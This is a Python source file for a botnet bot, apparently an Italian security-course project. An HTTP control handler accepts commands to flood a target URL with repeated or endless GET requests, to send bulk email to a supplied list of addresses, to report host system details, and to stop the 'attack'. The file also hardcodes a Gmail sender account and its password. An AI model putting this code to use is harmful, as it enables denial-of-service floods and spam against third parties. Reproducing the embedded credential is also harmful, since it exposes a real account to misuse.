import json
import platform
import smtplib
import ssl
import threading
from email.mime.text import MIMEText
from http.server import BaseHTTPRequestHandler
from urllib.error import HTTPError
from urllib.request import Request, urlopen

target = "-"
action = "waiting"
event = threading.Event()


class HTTPServerRH(BaseHTTPRequestHandler):

    # def log_message(self, format, *args):
    #    return

    def do_GET(self):
        global target
        global action
        if self.path == "/status":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/stopAttack":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            stopAttack()
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        elif self.path == "/getSystemInfo":
            target="-"
            action = "System info"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(getSystemInfo().encode('utf-8'))
            return

    def do_POST(self):
        global target
        global action

        contentLength = int(self.headers['Content-Length'])
        postData = self.rfile.read(contentLength).decode("utf-8")
        req = json.loads(postData)
        if self.path == "/doGet":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            execRequest(req["url"], req["time"])
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/sendEmail":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            batchEmail(req['oggetto'], req['messaggio'], req['utenti'])
            message = {"target": target, "action": action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def batchEmail(oggetto, message, utenti):
    global target
    global action
    ut = None
    if "[" in utenti and "]" in utenti and "," in utenti:
        ut = utenti.strip("[]").split(",")
    try:
        p = threading.Thread(target=sendEmail, args=(oggetto, message, ut if ut is not None else utenti))
        p.daemon = True
        p.start()
    except Exception as e:
        print(e)
    target = len(ut) if ut is not None else len(utenti)
    action = "Sending email to " + str(target) + " users"
    return target, action


def execRequest(url, time):
    global target
    global action
    global event
    if event.is_set():
        event.clear()
    try:
        p = threading.Thread(target=doRequest, args=(url, int(time)))
        p.daemon = True
        p.start()
    except Exception as e:
        print(e)
    target = url
    action = "Get " + str(time) + " times"
    return target, action


def stopAttack():
    global target
    global action
    event.set()
    target = "-"
    action = "waiting"
    return target, action


def getSystemInfo():
    try:
        uname = platform.uname()
        message = {
            "System": uname.system,
            "Node name": uname.node,
            "Release": uname.release,
            "Version": uname.version,
            "Machine": uname.machine,
            "Processor": platform.processor(),
        }
        return json.dumps(message)
    except Exception as e:
        print(e)
        return json.dumps({"Errore": "Informazioni non disponibili"})


def doRequest(url, time):
    global target
    global action
    global event
    i = 0
    
    while (i < time or time == -1) and not event.is_set():
        try:
            print("Get to", url, end="")
            req = Request(url)
            urlopen(req, timeout=10).read()
            print("")
        except HTTPError as e:
            print(" Request error:", url, "is not reachable:", e)
        if time != -1:
            i += 1
    target = "-"
    action = "waiting"


def sendEmail(oggetto, message, utenti):
    smtp_server = "smtp.gmail.com"
    port = 465
    password = "cebqshlncuewhjso"
    sender = "botnetsicurezza@gmail.com"
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender, password)
            msg = MIMEText(message)
            msg['Subject'] = oggetto
            msg['From'] = sender
            for u in utenti:
                if "'" in u:
                    u = u.replace("'", "")
                msg['To'] = u
                server.sendmail(sender, u, msg.as_string())
    except Exception as e:
        print(e)


def getStatus():
    global target
    global action
    return target, action
